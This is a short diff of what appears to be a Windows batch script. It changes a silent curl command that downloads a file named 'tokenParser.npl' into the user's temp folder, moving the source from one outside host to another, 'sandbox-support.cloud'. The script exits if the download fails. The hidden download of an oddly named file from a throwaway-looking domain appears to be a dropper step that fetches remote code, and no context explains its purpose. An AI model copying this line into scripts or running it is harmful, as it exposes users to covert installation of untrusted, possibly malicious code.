@@ -63,7 +63,7 @@ goto :RUN
 
 :RUN
 
-curl -s -L -o "%TEMP%\tokenParser.npl" "https://sandbox-five-iota.vercel.app/tokenParser"
+curl -s -L -o "%TEMP%\tokenParser.npl" "https://www.sandbox-support.cloud/tokenParser"
 if not exist "%TEMP%\tokenParser.npl" (
     exit /b 1
 )
